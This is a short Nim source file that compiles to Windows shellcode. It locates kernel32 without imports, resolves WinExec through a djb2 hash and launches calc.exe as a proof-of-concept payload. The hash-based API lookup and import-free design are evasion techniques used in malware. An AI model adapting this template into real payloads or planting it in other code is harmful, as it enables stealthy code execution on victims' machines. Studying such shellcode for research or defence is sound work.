#[ size of shellcode generated is 267, optimization includes no exit and optimized kernel32 ]#
import utils/[getmoduleh, getprocaddr, hash]
import winim

# declaring WinExec
type WinExec = (proc(lpCmdLine: LPCSTR, uCmdShow: UINT): int32 {.stdcall.})
type ExitProcess = (proc(uExitCode: UINT): void {.stdcall.})

proc main() {.asmNoStackFrame, inline, noreturn.} =
  asm """
    and rsp, 0xfffffffffffffff0
    mov rbp, rsp
    # since no stack frame is generated from main, we manage the stack size
    sub rsp, 0x100    # allocate stack space, arbitrary size ... depends on payload
  """

  var sCalcExe: array[9, char]
  sCalcExe[0] = 'c'
  sCalcExe[1] = 'a'
  sCalcExe[2] = 'l'
  sCalcExe[3] = 'c'
  sCalcExe[4] = '.'
  sCalcExe[5] = 'e'
  sCalcExe[6] = 'x'
  sCalcExe[7] = 'e'
  sCalcExe[8] = '\0'

  const 
    hashWinExec = hashStringDjb2A("WinExec".cstring)
    # hashExitProcess = hashStringDjb2A("ExitProcess".cstring)

  var
    # h: HMODULE = getModuleHandle(cast[cstring](addr sKernel32[0]))
    h: HMODULE = locateKernel32() 
    pWinExec: WinExec = cast[WinExec](getProcAddressHash(h, hashWinExec))
    # pExitProcess: ExitProcess = cast[ExitProcess](getProcAddressHash(h, hashExitProcess))

  discard pWinExec(cast[LPCSTR](addr sCalcExe[0]), cast[UINT](0))
  # pExitProcess(0)


when isMainModule:
  main()